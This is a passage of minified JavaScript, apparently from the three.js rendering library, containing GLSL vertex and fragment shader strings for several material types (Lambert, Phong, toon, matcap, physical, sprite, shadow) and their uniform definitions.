<envmap_common_pars_fragment>\n#include <envmap_pars_fragment>\n#include <cube_uv_reflection_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <fog_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <shadowmask_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\t#include <emissivemap_fragment>\n\t#ifdef DOUBLE_SIDED\n\t\treflectedLight.indirectDiffuse += ( gl_FrontFacing ) ? vIndirectFront : vIndirectBack;\n\t#else\n\t\treflectedLight.indirectDiffuse += vIndirectFront;\n\t#endif\n\t#include <lightmap_fragment>\n\treflectedLight.indirectDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb );\n\t#ifdef DOUBLE_SIDED\n\t\treflectedLight.directDiffuse = ( gl_FrontFacing ) ? vLightFront : vLightBack;\n\t#else\n\t\treflectedLight.directDiffuse = vLightFront;\n\t#endif\n\treflectedLight.directDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb ) * getShadowMask();\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\n\t#include <envmap_fragment>\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}", meshlambert_vert: "#define LAMBERT\nvarying vec3 vLightFront;\nvarying vec3 vIndirectFront;\n#ifdef DOUBLE_SIDED\n\tvarying vec3 vLightBack;\n\tvarying vec3 vIndirectBack;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <envmap_pars_vertex>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <worldpos_vertex>\n\t#include <envmap_vertex>\n\t#include <lights_lambert_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}", meshmatcap_frag: "#define MATCAP\nuniform vec3 diffuse;\nuniform float opacity;\nuniform sampler2D matcap;\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <fog_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\tvec3 viewDir = normalize( vViewPosition );\n\tvec3 x = normalize( vec3( viewDir.z, 0.0, - viewDir.x ) );\n\tvec3 y = cross( viewDir, x );\n\tvec2 uv = vec2( dot( x, normal ), dot( y, normal ) ) * 0.495 + 0.5;\n\t#ifdef USE_MATCAP\n\t\tvec4 matcapColor = texture2D( matcap, uv );\n\t\tmatcapColor = matcapTexelToLinear( matcapColor );\n\t#else\n\t\tvec4 matcapColor = vec4( 1.0 );\n\t#endif\n\tvec3 outgoingLight = diffuseColor.rgb * matcapColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}", meshmatcap_vert: "#define MATCAP\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <color_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#ifndef FLAT_SHADED\n\t\tvNormal = normalize( transformedNormal );\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n\tvViewPosition = - mvPosition.xyz;\n}", meshtoon_frag: "#define TOON\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform float opacity;\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <gradientmap_pars_fragment>\n#include <fog_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <lights_toon_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\t#include <emissivemap_fragment>\n\t#include <lights_toon_fragment>\n\t#include <lights_fragment_begin>\n\t#include <lights_fragment_maps>\n\t#include <lights_fragment_end>\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}", meshtoon_vert: "#define TOON\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n#ifndef FLAT_SHADED\n\tvNormal = normalize( transformedNormal );\n#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvViewPosition = - mvPosition.xyz;\n\t#include <worldpos_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}", meshphong_frag: "#define PHONG\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform vec3 specular;\nuniform float shininess;\nuniform float opacity;\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_pars_fragment>\n#include <cube_uv_reflection_fragment>\n#include <fog_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <lights_phong_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\t#include <emissivemap_fragment>\n\t#include <lights_phong_fragment>\n\t#include <lights_fragment_begin>\n\t#include <lights_fragment_maps>\n\t#include <lights_fragment_end>\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\n\t#include <envmap_fragment>\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}", meshphong_vert: "#define PHONG\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <envmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n#ifndef FLAT_SHADED\n\tvNormal = normalize( transformedNormal );\n#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvViewPosition = - mvPosition.xyz;\n\t#include <worldpos_vertex>\n\t#include <envmap_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}", meshphysical_frag: "#define STANDARD\n#ifdef PHYSICAL\n\t#define REFLECTIVITY\n\t#define CLEARCOAT\n\t#define TRANSMISSION\n#endif\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform float roughness;\nuniform float metalness;\nuniform float opacity;\n#ifdef TRANSMISSION\n\tuniform float transmission;\n#endif\n#ifdef REFLECTIVITY\n\tuniform float reflectivity;\n#endif\n#ifdef CLEARCOAT\n\tuniform float clearcoat;\n\tuniform float clearcoatRoughness;\n#endif\n#ifdef USE_SHEEN\n\tuniform vec3 sheen;\n#endif\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <transmissionmap_pars_fragment>\n#include <bsdfs>\n#include <cube_uv_reflection_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_physical_pars_fragment>\n#include <fog_pars_fragment>\n#include <lights_pars_begin>\n#include <lights_physical_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <clearcoat_pars_fragment>\n#include <roughnessmap_pars_fragment>\n#include <metalnessmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#ifdef TRANSMISSION\n\t\tfloat totalTransmission = transmission;\n\t#endif\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <roughnessmap_fragment>\n\t#include <metalnessmap_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\t#include <clearcoat_normal_fragment_begin>\n\t#include <clearcoat_normal_fragment_maps>\n\t#include <emissivemap_fragment>\n\t#include <transmissionmap_fragment>\n\t#include <lights_physical_fragment>\n\t#include <lights_fragment_begin>\n\t#include <lights_fragment_maps>\n\t#include <lights_fragment_end>\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\n\t#ifdef TRANSMISSION\n\t\tdiffuseColor.a *= mix( saturate( 1. - totalTransmission + linearToRelativeLuminance( reflectedLight.directSpecular + reflectedLight.indirectSpecular ) ), 1.0, metalness );\n\t#endif\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}", meshphysical_vert: "#define STANDARD\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n#ifndef FLAT_SHADED\n\tvNormal = normalize( transformedNormal );\n\t#ifdef USE_TANGENT\n\t\tvTangent = normalize( transformedTangent );\n\t\tvBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );\n\t#endif\n#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvViewPosition = - mvPosition.xyz;\n\t#include <worldpos_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}", normal_frag: "#define NORMAL\nuniform float opacity;\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( TANGENTSPACE_NORMALMAP )\n\tvarying vec3 vViewPosition;\n#endif\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <packing>\n#include <uv_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\t#include <logdepthbuf_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\tgl_FragColor = vec4( packNormalToRGB( normal ), opacity );\n}", normal_vert: "#define NORMAL\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( TANGENTSPACE_NORMALMAP )\n\tvarying vec3 vViewPosition;\n#endif\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n#ifndef FLAT_SHADED\n\tvNormal = normalize( transformedNormal );\n\t#ifdef USE_TANGENT\n\t\tvTangent = normalize( transformedTangent );\n\t\tvBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );\n\t#endif\n#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( TANGENTSPACE_NORMALMAP )\n\tvViewPosition = - mvPosition.xyz;\n#endif\n}", points_frag: "uniform vec3 diffuse;\nuniform float opacity;\n#include <common>\n#include <color_pars_fragment>\n#include <map_particle_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_particle_fragment>\n\t#include <color_fragment>\n\t#include <alphatest_fragment>\n\toutgoingLight = diffuseColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n}", points_vert: "uniform float size;\nuniform float scale;\n#include <common>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <color_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <project_vertex>\n\tgl_PointSize = size;\n\t#ifdef USE_SIZEATTENUATION\n\t\tbool isPerspective = isPerspectiveMatrix( projectionMatrix );\n\t\tif ( isPerspective ) gl_PointSize *= ( scale / - mvPosition.z );\n\t#endif\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <worldpos_vertex>\n\t#include <fog_vertex>\n}", shadow_frag: "uniform vec3 color;\nuniform float opacity;\n#include <common>\n#include <packing>\n#include <fog_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <shadowmap_pars_fragment>\n#include <shadowmask_pars_fragment>\nvoid main() {\n\tgl_FragColor = vec4( color, opacity * ( 1.0 - getShadowMask() ) );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}", shadow_vert: "#include <common>\n#include <fog_pars_vertex>\n#include <shadowmap_pars_vertex>\nvoid main() {\n\t#include <begin_vertex>\n\t#include <project_vertex>\n\t#include <worldpos_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}", sprite_frag: "uniform vec3 diffuse;\nuniform float opacity;\n#include <common>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\toutgoingLight = diffuseColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}", sprite_vert: "uniform float rotation;\nuniform vec2 center;\n#include <common>\n#include <uv_pars_vertex>\n#include <fog_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\tvec4 mvPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );\n\tvec2 scale;\n\tscale.x = length( vec3( modelMatrix[ 0 ].x, modelMatrix[ 0 ].y, modelMatrix[ 0 ].z ) );\n\tscale.y = length( vec3( modelMatrix[ 1 ].x, modelMatrix[ 1 ].y, modelMatrix[ 1 ].z ) );\n\t#ifndef USE_SIZEATTENUATION\n\t\tbool isPerspective = isPerspectiveMatrix( projectionMatrix );\n\t\tif ( isPerspective ) scale *= - mvPosition.z;\n\t#endif\n\tvec2 alignedPosition = ( position.xy - ( center - vec2( 0.5 ) ) ) * scale;\n\tvec2 rotatedPosition;\n\trotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;\n\trotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;\n\tmvPosition.xy += rotatedPosition;\n\tgl_Position = projectionMatrix * mvPosition;\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n}" },
            Qn = { common: { diffuse: { value: new Wt(15658734) }, opacity: { value: 1 }, map: { value: null }, uvTransform: { value: new de }, uv2Transform: { value: new de }, alphaMap: { value: null } }, specularmap: { specularMap: { value: null } }, envmap: { envMap: { value: null }, flipEnvMap: { value: -1 }, reflectivity: { value: 1 }, refractionRatio: { value: .98 }, maxMipLevel: { value: 0 } }, aomap: { aoMap: { value: null }, aoMapIntensity: { value: 1 } }, lightmap: { lightMap: { value: null }, lightMapIntensity: { value: 1 } }, emissivemap: { emissiveMap: { value: null } }, bumpmap: { bumpMap: { value: null }, bumpScale: { value: 1 } }, normalmap: { normalMap: { value: null }, normalScale: { value: new he(1, 1) } }, displacementmap: { displacementMap: { value: null }, displacementScale: { value: 1 }, displacementBias: { value: 0 } }, roughnessmap: { roughnessMap: { value: null } }, metalnessmap: { metalnessMap: { value: null } }, gradientmap: { gradientMap: { value: null } }, fog: { fogDensity: { value: 25e-5 }, fogNear: { value: 1 }, fogFar: { value: 2e3 }, fogColor: { value: new Wt(16777215) } }, lights: { ambientLightColor: { value: [] }, lightProbe: { value: [] }, directionalLights: { value: [], properties: { direction: {}, color: {} } }, directionalLightShadows: { value: [], properties: { shadowBias: {}, shadowNormalBias: {}, shadowRadius: {}, shadowMapSize: {} } }, directionalShadowMap: { value: [] }, directionalShadowMatrix: { value: [] }, spotLights: { value: [], properties: { color: {}, position: {}, direction: {}, distance: {}, coneCos: {}, penumbraCos: {}, decay: {} } }, spotLightShadows: { value: [], properties: { shadowBias: {}, shadowNormalBias: {}, shadowRadius: {}, shadowMapSize: {} } }, spotShadowMap: { value: [] }, spotShadowMatrix: { value: [] }, pointLights: { value: [], properties: { color: {}, position: {}, decay: {}, distance: {} } }, pointLightShadows: { value: [], properties: { shadowBias: {}, shadowNormalBias: {}, shadowRadius: {}, shadowMapSize: {}, shadowCameraNear: {}, shadowCameraFar: {} } }, pointShadowMap: { value: [] }, pointShadowMatrix: { value: [] }, hemisphereLights: { value: [], properties: { direction: {}, skyColor: {}, groundColor: {} } }, rectAreaLights: { value: [], properties: { color: {}, position: {}, width: {}, height: {} } }, ltc_1: { value: null }, ltc_2: { value: null } }, points: { diffuse: { value: new Wt(15658734) }, opacity: { value: 1 }, size: { value: 1 }, scale: { value: 1 }, map: { value: null }, alphaMap: { value: null }, uvTransform: { value: new de } }, sprite: { diffuse: { value: new Wt(15658734) }, opacity: { value: 1 }, center: { value: new he(.5, .5) }, rotation: { value: 0 }, map: { value: null }, alphaMap: { value: null }, uvTransform: { value: new de } } },
            ei = { basic: { uniforms: Hn([Qn.common, Qn.specularmap, Qn.envmap, Qn.aomap, Qn.lightmap, Qn.fog]), vertexShader: $n.meshbasic_vert, fragmentShader: $n.meshbasic_frag }, lambert: { uniforms: Hn([Qn.common, Qn.specularmap, Qn.envmap, Qn.aomap, Qn.lightmap, Qn.emissivemap, Qn.fog, Qn.lights, { emissive: { value: new Wt(0) } }]), vertexShader: $n.meshlambert_vert, fragmentShader: $n.meshlambert_frag }, phong: { uniforms: Hn([Qn.common, Qn.specularmap, Qn.envmap, Qn.aomap, Qn.lightmap, Qn.emissivemap, Qn.bumpmap, Qn.normalmap, Qn.displacementmap, Qn.fog, Qn.lights, { emissive: { value: new Wt(0) }, specular: { value: new Wt(1118481) }, shininess: { value: 30 } }]), vertexShader: $n.meshphong_vert, fragmentShader: $n.meshphong_frag }, standard: { uniforms: Hn([Qn.common, Qn.envmap, Qn.aomap, Qn.lightmap, Qn.emissivemap, Qn.bumpmap, Qn.normalmap, Qn.displacementmap, Qn.roughnessmap, Qn.metalnessmap, Qn.fog, Qn.lights, { emissive: { value: new Wt(0) }, roughness: { value: 1 }, metalness: { value: 0 }, envMapIntensity: { value: 1 } }]), vertexShader: $n.meshphysical_vert, fragmentShader: $n.meshphysical_frag }, toon: { uniforms: Hn([Qn.common, Qn.aomap, Qn.lightmap, Qn.emissivemap, Qn.bumpmap, Qn.normalmap, Qn.displacementmap, Qn.gradientmap, Qn.fog, Qn.lights, { emissive: { value: new Wt(0) } }]), vertexShader: $n.meshtoon_vert, fragmentShader: $n.meshtoon_frag }, matcap: { uniforms: Hn([Qn.common, Qn.bumpmap, Qn.normalmap, Qn.displacementmap, Qn.fog, { matcap: { value: null } }]), vertexShader: $n.meshmatcap_vert, fragmentShader: $n.meshmatcap_frag }, points: { uniforms: Hn([Qn.points, Qn.fog]), vertexShader: $n.points_vert, fragmentShader: $n.points_frag }, dashed: { uniforms: Hn([Qn.common, Qn.fog, { scale: { value: 1 }, dashSize: { value: 1 }, totalSize: { value: 2 } }]), vertexShader: $n.linedashed_vert, fragmentShader: $n.linedashed_frag }, depth: { uniforms: Hn([Qn.common, Qn.displacementmap]), vertexShader: $n.depth_vert, fragmentShader: $n.depth_frag }, normal: { uniforms: Hn([Qn.common, Qn.bumpmap, Qn.normalmap, Qn.displacementmap, { opacity: { value: 1 } }]), vertexShader: $n.normal_vert, fragmentShader: $n.normal_frag }, sprite: { uniforms: Hn([Qn.sprite, Qn.fog]), vertexShader: $n.sprite_vert, fragmentShader: $n.sprite_frag }, background: { uniforms: { uvTransform: { value: new de }, t2D: { value: null } }, vertexShader: $n.background_vert, fragmentShader: $n.background_frag }, cube: { uniforms: Hn([Qn.envmap, { opacity: { value: 1 } }]), vertexShader: $n.cube_vert, fragmentShader: $n.cube_frag }, equirect: { uniforms: { tEquirect: { value: null } }, vertexShader: $n.equirect_vert, fragmentShader: $n.equirect_frag }, distanceRGBA: { uniforms: Hn([Qn.common, Qn.displacementmap, { referencePosition: { value: new be }, nearDistance: { value: 1 }, farDistance: { value: 1e3 } }]), vertexShader: $n.distanceRGBA_vert, fragmentShader: $n.distanceRGBA_frag }, shadow: { uniforms: Hn([Qn.lights, Qn.fog, { color: { value: new Wt(0) }, opacity: { value: 1 } }]), vertexShader: $n.shadow_vert, fragmentShader: $n.shadow_frag } };

        function ti(e, t, n, i, r) {
            const a = new Wt(0);
            let o, s, l = 0,
                c = null,
                u = 0,
